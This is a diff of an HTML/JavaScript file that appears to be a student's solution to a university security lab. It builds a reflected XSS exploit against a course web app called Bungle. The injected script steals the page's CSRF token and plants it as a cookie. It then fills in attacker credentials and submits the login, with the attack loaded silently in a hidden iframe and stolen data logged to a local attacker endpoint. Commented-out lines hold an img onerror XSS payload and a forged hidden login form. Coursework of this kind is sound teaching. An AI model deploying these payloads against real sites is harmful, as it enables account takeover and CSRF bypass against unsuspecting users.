@@ -1,4 +1,5 @@
 <meta charset="utf-8">
+<iframe id="ifm" style="visibility:hidden" src="" name="myiframe"></iframe>
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 <script>
 // Extend this function:
@@ -11,17 +12,29 @@ function payload(attacker) {
         $("html").load(href, function(){
             $("html").show();
             log({event: "nav", uri: href});
-            $("#query").val($('[name="csrf_token"]').attr('value'));
-            $("#query").val('pwned');
+            var s = $('input[name="csrf_token"]').val();
+	    $("#query").val(s);
             $('[name="username"]').attr('value','attacker');
             $('[name="password"]').attr('value','p_13tth5x');
-            $('#log-in-btn').click();            
+            //$('input[name="csrf_token"]').val("234");
+	    //$('form[action="./login"]').submit();
+
+	    //var f = $('<form id="f" action="http://cos432-assn3.cs.princeton.edu/login?csrfdefense=1&xssdefense=0" method="POST" visibility="hidden"></form>');
+	    //f.append('<input type="hidden" name="username" value="attacker"></input>');
+	    //f.append('<input type="hidden" name="password" value="p_13tth5x"></input>');
+	    //f.append('<input type="hidden" name="csrf_token" value="' + s + '"></input>');
+	    document.cookie = "csrf_token="+s + "; path=/";
+
+	    //$('form#f').submit();
+	    $('#log-in-btn').click();
         }); }
     $("html").hide();
-    proxy("./");
+    proxy("http://cos432-assn3.cs.princeton.edu/");
 }
 function makeLink(xssdefense, target, attacker) {
     if (xssdefense == 0) {
+	//return target + "/search?csrfdefense=1&xssdefense=" + xssdefense.toString() + "&q=" +
+	//		encodeURIComponent("<img src='/' onerror='"+payload.toString()+";payload(\" attacker\" );'></img>");
         return target + "./search?csrfdefense=1&xssdefense=" + xssdefense.toString() + "&q=" +
             encodeURIComponent("<script" + ">" + payload.toString() +
                                ";payload(\"" + attacker + "\");</script" + ">");
@@ -33,7 +46,8 @@ var target = "http://cos432-assn3.cs.princeton.edu/";
 var attacker = "http://127.0.0.1:31337/stolen";
 $(function() {
     var url = makeLink(xssdefense, target, attacker);
-    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+    //$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+    $('#ifm').attr("src", url);
 });
 </script>
 <h3></h3>
